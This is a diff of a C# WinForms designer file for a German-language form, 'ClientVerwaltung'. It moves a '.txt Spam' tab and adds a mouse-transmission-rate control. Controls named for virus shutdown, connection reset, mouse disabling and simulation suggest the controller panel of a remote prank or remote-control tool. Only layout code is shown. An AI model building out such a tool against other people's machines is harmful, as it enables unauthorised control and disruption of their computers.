@@ -34,6 +34,8 @@
             this.label1 = new System.Windows.Forms.Label();
             this.monoFlat_HeaderLabel1 = new MonoFlat.Class1.MonoFlat_HeaderLabel();
             this.metroTabControl1 = new MetroFramework.Controls.MetroTabControl();
+            this.metroTabPage4 = new MetroFramework.Controls.MetroTabPage();
+            this.monoFlat_ButtonTXTSpam = new MonoFlat.Class1.MonoFlat_Button();
             this.metroTabPage2 = new MetroFramework.Controls.MetroTabPage();
             this.Button_Maus_Simulate = new MonoFlat.Class1.MonoFlat_Button();
             this.Button_Maus_Disable = new MonoFlat.Class1.MonoFlat_Button();
@@ -59,19 +61,20 @@
             this.Button_VirusConnectionReset = new MonoFlat.Class1.MonoFlat_Button();
             this.Button_VirusShutdown = new MonoFlat.Class1.MonoFlat_Button();
             this.Button_VirusExit = new MonoFlat.Class1.MonoFlat_Button();
-            this.metroTabPage4 = new MetroFramework.Controls.MetroTabPage();
-            this.monoFlat_ButtonTXTSpam = new MonoFlat.Class1.MonoFlat_Button();
             this.bunifuCheckbox1 = new Bunifu.Framework.UI.BunifuCheckbox();
             this.bunifuCustomLabel1 = new Bunifu.Framework.UI.BunifuCustomLabel();
             this.timerSendMousePosition = new System.Windows.Forms.Timer(this.components);
             this.MessageCheckTimer = new System.Windows.Forms.Timer(this.components);
             this.bunifuFlatButtonSend = new Bunifu.Framework.UI.BunifuFlatButton();
+            this.numericUpDown1 = new System.Windows.Forms.NumericUpDown();
+            this.bunifuCustomLabel2 = new Bunifu.Framework.UI.BunifuCustomLabel();
             this.metroTabControl1.SuspendLayout();
+            this.metroTabPage4.SuspendLayout();
             this.metroTabPage2.SuspendLayout();
             this.metroTabPage3.SuspendLayout();
             this.panel1.SuspendLayout();
             this.metroTabPage1.SuspendLayout();
-            this.metroTabPage4.SuspendLayout();
+            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown1)).BeginInit();
             this.SuspendLayout();
             // 
             // TextBox_Commands
@@ -117,16 +120,16 @@
             // 
             // metroTabControl1
             // 
+            this.metroTabControl1.Controls.Add(this.metroTabPage1);
             this.metroTabControl1.Controls.Add(this.metroTabPage4);
             this.metroTabControl1.Controls.Add(this.metroTabPage2);
             this.metroTabControl1.Controls.Add(this.metroTabPage3);
-            this.metroTabControl1.Controls.Add(this.metroTabPage1);
             this.metroTabControl1.CustomBackground = false;
             this.metroTabControl1.FontSize = MetroFramework.MetroTabControlSize.Medium;
             this.metroTabControl1.FontWeight = MetroFramework.MetroTabControlWeight.Light;
             this.metroTabControl1.Location = new System.Drawing.Point(-3, 239);
             this.metroTabControl1.Name = "metroTabControl1";
-            this.metroTabControl1.SelectedIndex = 3;
+            this.metroTabControl1.SelectedIndex = 1;
             this.metroTabControl1.Size = new System.Drawing.Size(481, 333);
             this.metroTabControl1.Style = MetroFramework.MetroColorStyle.Blue;
             this.metroTabControl1.StyleManager = null;
@@ -134,6 +137,41 @@
             this.metroTabControl1.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
             this.metroTabControl1.Theme = MetroFramework.MetroThemeStyle.Light;
             this.metroTabControl1.UseStyleColors = false;
+            // 
+            // metroTabPage4
+            // 
+            this.metroTabPage4.Controls.Add(this.monoFlat_ButtonTXTSpam);
+            this.metroTabPage4.CustomBackground = false;
+            this.metroTabPage4.HorizontalScrollbar = false;
+            this.metroTabPage4.HorizontalScrollbarBarColor = true;
+            this.metroTabPage4.HorizontalScrollbarHighlightOnWheel = false;
+            this.metroTabPage4.HorizontalScrollbarSize = 10;
+            this.metroTabPage4.Location = new System.Drawing.Point(4, 35);
+            this.metroTabPage4.Name = "metroTabPage4";
+            this.metroTabPage4.Size = new System.Drawing.Size(473, 294);
+            this.metroTabPage4.Style = MetroFramework.MetroColorStyle.Blue;
+            this.metroTabPage4.StyleManager = null;
+            this.metroTabPage4.TabIndex = 3;
+            this.metroTabPage4.Text = "Datei-Verwaltung";
+            this.metroTabPage4.Theme = MetroFramework.MetroThemeStyle.Light;
+            this.metroTabPage4.VerticalScrollbar = false;
+            this.metroTabPage4.VerticalScrollbarBarColor = true;
+            this.metroTabPage4.VerticalScrollbarHighlightOnWheel = false;
+            this.metroTabPage4.VerticalScrollbarSize = 10;
+            // 
+            // monoFlat_ButtonTXTSpam
+            // 
+            this.monoFlat_ButtonTXTSpam.BackColor = System.Drawing.Color.Transparent;
+            this.monoFlat_ButtonTXTSpam.Font = new System.Drawing.Font("Segoe UI", 12F);
+            this.monoFlat_ButtonTXTSpam.Image = null;
+            this.monoFlat_ButtonTXTSpam.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
+            this.monoFlat_ButtonTXTSpam.Location = new System.Drawing.Point(12, 12);
+            this.monoFlat_ButtonTXTSpam.Name = "monoFlat_ButtonTXTSpam";
+            this.monoFlat_ButtonTXTSpam.Size = new System.Drawing.Size(150, 40);
+            this.monoFlat_ButtonTXTSpam.TabIndex = 3;
+            this.monoFlat_ButtonTXTSpam.Text = ".txt Spam";
+            this.monoFlat_ButtonTXTSpam.TextAlignment = System.Drawing.StringAlignment.Center;
+            this.monoFlat_ButtonTXTSpam.Click += new System.EventHandler(this.monoFlat_ButtonDektopTXT_Click);
             // 
             // metroTabPage2
             // 
@@ -516,41 +554,6 @@
             this.Button_VirusExit.TextAlignment = System.Drawing.StringAlignment.Center;
             this.Button_VirusExit.Click += new System.EventHandler(this.Button_VirusExit_Click);
             // 
-            // metroTabPage4
-            // 
-            this.metroTabPage4.Controls.Add(this.monoFlat_ButtonTXTSpam);
-            this.metroTabPage4.CustomBackground = false;
-            this.metroTabPage4.HorizontalScrollbar = false;
-            this.metroTabPage4.HorizontalScrollbarBarColor = true;
-            this.metroTabPage4.HorizontalScrollbarHighlightOnWheel = false;
-            this.metroTabPage4.HorizontalScrollbarSize = 10;
-            this.metroTabPage4.Location = new System.Drawing.Point(4, 35);
-            this.metroTabPage4.Name = "metroTabPage4";
-            this.metroTabPage4.Size = new System.Drawing.Size(473, 294);
-            this.metroTabPage4.Style = MetroFramework.MetroColorStyle.Blue;
-            this.metroTabPage4.StyleManager = null;
-            this.metroTabPage4.TabIndex = 3;
-            this.metroTabPage4.Text = "Datei-Verwaltung";
-            this.metroTabPage4.Theme = MetroFramework.MetroThemeStyle.Light;
-            this.metroTabPage4.VerticalScrollbar = false;
-            this.metroTabPage4.VerticalScrollbarBarColor = true;
-            this.metroTabPage4.VerticalScrollbarHighlightOnWheel = false;
-            this.metroTabPage4.VerticalScrollbarSize = 10;
-            // 
-            // monoFlat_ButtonTXTSpam
-            // 
-            this.monoFlat_ButtonTXTSpam.BackColor = System.Drawing.Color.Transparent;
-            this.monoFlat_ButtonTXTSpam.Font = new System.Drawing.Font("Segoe UI", 12F);
-            this.monoFlat_ButtonTXTSpam.Image = null;
-            this.monoFlat_ButtonTXTSpam.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
-            this.monoFlat_ButtonTXTSpam.Location = new System.Drawing.Point(12, 12);
-            this.monoFlat_ButtonTXTSpam.Name = "monoFlat_ButtonTXTSpam";
-            this.monoFlat_ButtonTXTSpam.Size = new System.Drawing.Size(150, 40);
-            this.monoFlat_ButtonTXTSpam.TabIndex = 3;
-            this.monoFlat_ButtonTXTSpam.Text = ".txt Spam";
-            this.monoFlat_ButtonTXTSpam.TextAlignment = System.Drawing.StringAlignment.Center;
-            this.monoFlat_ButtonTXTSpam.Click += new System.EventHandler(this.monoFlat_ButtonDektopTXT_Click);
-            // 
             // bunifuCheckbox1
             // 
             this.bunifuCheckbox1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(132)))), ((int)(((byte)(135)))), ((int)(((byte)(140)))));
@@ -558,7 +561,7 @@
             this.bunifuCheckbox1.Checked = false;
             this.bunifuCheckbox1.CheckedOnColor = System.Drawing.Color.FromArgb(((int)(((byte)(51)))), ((int)(((byte)(205)))), ((int)(((byte)(117)))));
             this.bunifuCheckbox1.ForeColor = System.Drawing.Color.White;
-            this.bunifuCheckbox1.Location = new System.Drawing.Point(179, 204);
+            this.bunifuCheckbox1.Location = new System.Drawing.Point(90, 202);
             this.bunifuCheckbox1.Name = "bunifuCheckbox1";
             this.bunifuCheckbox1.Size = new System.Drawing.Size(20, 20);
             this.bunifuCheckbox1.TabIndex = 9;
@@ -567,7 +570,7 @@
             // bunifuCustomLabel1
             // 
             this.bunifuCustomLabel1.AutoSize = true;
-            this.bunifuCustomLabel1.Location = new System.Drawing.Point(200, 208);
+            this.bunifuCustomLabel1.Location = new System.Drawing.Point(111, 206);
             this.bunifuCustomLabel1.Name = "bunifuCustomLabel1";
             this.bunifuCustomLabel1.Size = new System.Drawing.Size(90, 13);
             this.bunifuCustomLabel1.TabIndex = 10;
@@ -575,7 +578,7 @@
             // 
             // timerSendMousePosition
             // 
-            this.timerSendMousePosition.Interval = 200;
+            this.timerSendMousePosition.Interval = 80;
             this.timerSendMousePosition.Tick += new System.EventHandler(this.timerSendMousePosition_Tick);
             // 
             // MessageCheckTimer
@@ -618,11 +621,50 @@
             this.bunifuFlatButtonSend.TextFont = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
             this.bunifuFlatButtonSend.Click += new System.EventHandler(this.bunifuFlatButtonSend_Click);
             // 
+            // numericUpDown1
+            // 
+            this.numericUpDown1.Increment = new decimal(new int[] {
+            5,
+            0,
+            0,
+            0});
+            this.numericUpDown1.Location = new System.Drawing.Point(286, 202);
+            this.numericUpDown1.Maximum = new decimal(new int[] {
+            300,
+            0,
+            0,
+            0});
+            this.numericUpDown1.Minimum = new decimal(new int[] {
+            30,
+            0,
+            0,
+            0});
+            this.numericUpDown1.Name = "numericUpDown1";
+            this.numericUpDown1.Size = new System.Drawing.Size(132, 20);
+            this.numericUpDown1.TabIndex = 11;
+            this.numericUpDown1.Value = new decimal(new int[] {
+            80,
+            0,
+            0,
+            0});
+            this.numericUpDown1.ValueChanged += new System.EventHandler(this.numericUpDown1_ValueChanged);
+            // 
+            // bunifuCustomLabel2
+            // 
+            this.bunifuCustomLabel2.AutoSize = true;
+            this.bunifuCustomLabel2.Location = new System.Drawing.Point(295, 225);
+            this.bunifuCustomLabel2.Name = "bunifuCustomLabel2";
+            this.bunifuCustomLabel2.Size = new System.Drawing.Size(113, 13);
+            this.bunifuCustomLabel2.TabIndex = 12;
+            this.bunifuCustomLabel2.Text = "Mausübertragungsrate";
+            // 
             // ClientVerwaltung
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
             this.ClientSize = new System.Drawing.Size(476, 573);
+            this.Controls.Add(this.bunifuCustomLabel2);
+            this.Controls.Add(this.numericUpDown1);
             this.Controls.Add(this.bunifuCustomLabel1);
             this.Controls.Add(this.bunifuCheckbox1);
             this.Controls.Add(this.metroTabControl1);
@@ -636,11 +678,12 @@
             this.TransparencyKey = System.Drawing.Color.Fuchsia;
             this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.ClientVerwaltung_FormClosed);
             this.metroTabControl1.ResumeLayout(false);
+            this.metroTabPage4.ResumeLayout(false);
             this.metroTabPage2.ResumeLayout(false);
             this.metroTabPage3.ResumeLayout(false);
             this.panel1.ResumeLayout(false);
             this.metroTabPage1.ResumeLayout(false);
-            this.metroTabPage4.ResumeLayout(false);
+            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown1)).EndInit();
             this.ResumeLayout(false);
             this.PerformLayout();
 
@@ -683,5 +726,7 @@
         private System.Windows.Forms.Panel panel1;
         private System.Windows.Forms.RichTextBox richTextBoxSendText;
         private MonoFlat.Class1.MonoFlat_Button monoFlat_ButtonTXTSpam;
+        private System.Windows.Forms.NumericUpDown numericUpDown1;
+        private Bunifu.Framework.UI.BunifuCustomLabel bunifuCustomLabel2;
     }
 }
